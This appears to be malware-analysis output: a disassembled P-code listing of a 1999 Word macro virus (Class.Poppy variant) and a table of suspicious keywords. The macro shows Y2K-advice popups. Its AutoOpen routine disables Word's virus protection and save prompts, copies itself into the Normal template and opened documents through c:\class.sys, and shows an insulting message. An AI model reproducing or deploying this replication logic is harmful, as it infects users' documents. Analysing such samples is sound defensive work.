' 	LitStr 0x0205 "Lets start our first lesson to help prepare you for the millennium bug. Although I don't personally believe there will be food shortages, power shortages, gas shortages as a result of a computer bug, there will be food, power and gas shortages by hoarding nitwits that fear the millennium bug. As a result, I highly recommend that you begin to stockpile bottled water (1-month supply), canned food (1-month supply), and as much gas as you can store (keep your vehicle gas tank always topped up starting December 1st)."
' 	St msg$ 
' Line #87:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #88:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #89:
' 	EndIfBlock 
' Line #90:
' Line #91:
' 	QuoteRem 0x0000 0x000C "June 1, 1999"
' Line #92:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #93:
' 	LitStr 0x0012 "How's the weather?"
' 	St Title$ 
' Line #94:
' 	LitStr 0x026A "Right now it's pretty warm out, so you are probably not thinking much about the winter. But remember the millennium bug is expected to hit in the middle of winter. If you're in a northern climate, like the Great White North (Canada), I suggest you consider purchasing a good airtight wood stove, and at least a face cord of wood. Even if there are no disruptions in natural gas, or oil, or electricity, the wood stove is a great way of reducing your heating bills. And if there is a problem, you will be comfortable in your own heated home, unlike your unprepared neighbors (remember the Canadian ice storm last year!)"
' 	St msg$ 
' Line #95:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #96:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' 	QuoteRem 0x0000 0x000C "July 2, 1999"
' Line #100:
' 	Ld dd 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #101:
' 	LitStr 0x0016 "Did you get the stove?"
' 	St Title$ 
' Line #102:
' 	LitStr 0x017D "Last month I recommend purchasing a gas stove to help heat your home in the event that your supply of electricity, gas, or oil was interrupted. This month I would like to suggest that you purchase a portable generator and enough gas cans to store gas to power the generator. The generator can be used to power lighting and small electrical appliances should the power be disrupted."
' 	St msg$ 
' Line #103:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #104:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' 	QuoteRem 0x0000 0x000E "August 2, 1999"
' Line #108:
' 	Ld dd 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #109:
' 	LitStr 0x0016 "Getting back to basics"
' 	St Title$ 
' Line #110:
' 	LitStr 0x01FA "In this installment, I would like to suggest that you consider purchasing candles, matches, flashlights, and batteries. These items will be invaluable during those cold, dark nights should the power companies fail in their Y2K conversion. Don't plan on relying on the banks or credit/debit cards. Start each month, and stash away enough money to last you at least 2 months. This money should include enough money to pay the rent/mortgage, utilities, FOOD, etc. Remember cold hard cash is accept EVERYWHERE."
' 	St msg$ 
' Line #111:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #112:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x0011 "September 1, 1999"
' Line #116:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #117:
' 	LitStr 0x000A "A Limerick"
' 	St Title$ 
' Line #118:
' 	LitStr 0x001E "The millennium 's not far away"
' 	St msg$ 
' Line #119:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "Get onto your coding today"
' 	Add 
' 	St msg$ 
' Line #120:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "Fix it or fudge it"
' 	Add 
' 	St msg$ 
' Line #121:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "The boss won't begrudge it"
' 	Add 
' 	St msg$ 
' Line #122:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "If everything works on the day!"
' 	Add 
' 	St msg$ 
' Line #123:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #124:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #125:
' 	EndIfBlock 
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x000F "October 1, 1999"
' Line #128:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #129:
' 	LitStr 0x0012 "Three months to go"
' 	St Title$ 
' Line #130:
' 	LitStr 0x0112 "Getting nervous? If you've followed my advice over the past months, there should be nothing for you to worry about. We will survive the Y2K bug, but preparation will insure that if there is any Y2K crisis, it will only be small bump on the road, not a major pothole for you."
' 	St msg$ 
' Line #131:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002E "That 's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #132:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #133:
' 	EndIfBlock 
' Line #134:
' Line #135:
' 	QuoteRem 0x0000 0x0010 "November 1, 1999"
' Line #136:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #137:
' 	LitStr 0x0010 "Two months to go"
' 	St Title$ 
' Line #138:
' 	LitStr 0x0179 "Personally, I don't believe that there will be a major, global Y2K crisis. I trust the banks with my money, I trust MOST of the industrial sector, and I trust the power and water agencies to provide me with power and water over the "infamous" weekend. I even trust the Russians and there nuclear arms! BUT you can never be too careful. Take care. Be prepared. Use common sense."
' 	St msg$ 
' Line #139:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002E "That 's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #140:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #141:
' 	EndIfBlock 
' Line #142:
' Line #143:
' 	QuoteRem 0x0000 0x0010 "December 1, 1999"
' Line #144:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #145:
' 	LitStr 0x0019 "Good Luck (30 days to go)"
' 	St Title$ 
' Line #146:
' 	LitStr 0x00F8 "Well, this will be the final installment in the Y2K preparation lessons. If you have followed my advice over the past few months, you will be in excellent shape to bring in the New Year. May the New Year bring you health and happiness. Best wishes."
' 	St msg$ 
' Line #147:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x0004 "Bye!"
' 	Add 
' 	St msg$ 
' Line #148:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #149:
' 	EndIfBlock 
' Line #150:
' Line #151:
' 	Label end_here 
' Line #152:
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub AutoOpen())
' Line #155:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #156:
' 	OnError out 
' Line #157:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #158:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #159:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #160:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #161:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #162:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #163:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #164:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #165:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #166:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #167:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #168:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #169:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #170:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #171:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #172:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #173:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #174:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #175:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #176:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #177:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #180:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #181:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #182:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #183:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #184:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #185:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #186:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #187:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #188:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #189:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #190:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #191:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #192:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #193:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #194:
' 	EndWith 
' Line #195:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #196:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #197:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #198:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #199:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #200:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #201:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #202:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #203:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #204:
' 	EndWith 
' Line #205:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #208:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #209:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #210:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #211:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #212:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #213:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #214:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #215:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #216:
' 	EndWith 
' Line #217:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #218:
' 	Label out 
' Line #219:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #220:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #221:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #222:
' 	EndSub 
' Line #223:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #224:
' 	FuncDefn (Sub ViewVBCode())
' Line #225:
' 	QuoteRem 0x0000 0x0062 "James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit"
' Line #226:
' 	EndSub 
' Line #227:
' Line #228:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

